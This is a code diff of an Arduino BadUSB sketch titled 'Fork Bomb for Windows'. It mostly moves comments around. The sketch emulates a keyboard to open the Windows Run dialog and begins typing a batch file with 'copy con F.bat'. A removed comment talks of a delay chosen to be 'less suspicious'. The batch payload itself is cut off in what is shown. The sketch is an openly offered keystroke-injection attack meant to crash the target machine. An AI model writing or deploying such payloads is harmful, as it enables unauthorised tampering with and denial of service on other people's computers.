@@ -1,5 +1,6 @@
-#include <Keyboard.h>
+// Fork Bomb for Windows. By: BlueArduino20
 
+#include <Keyboard.h>
 
 // Utility function
 void typeKey(int key){
@@ -10,16 +11,13 @@ void typeKey(int key){
 
 void setup()
 {
-
+  
+  // Let's give windows time to recognize our BadUSB
   delay(3500);
   
   Keyboard.begin();
 
-  // Start Payload
-  
-  // Fork Bomb for Windows. By: BlueArduino20
-
-  // Let's give windows time to recognize our BadUSB
+  // Start Payload 
 
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press(114);
@@ -34,8 +32,6 @@ void setup()
   typeKey(KEY_RETURN);
 
   delay(100);
-
-  // Some bat delay (Less suspicious)
 
   Keyboard.print("copy con F.bat");
 
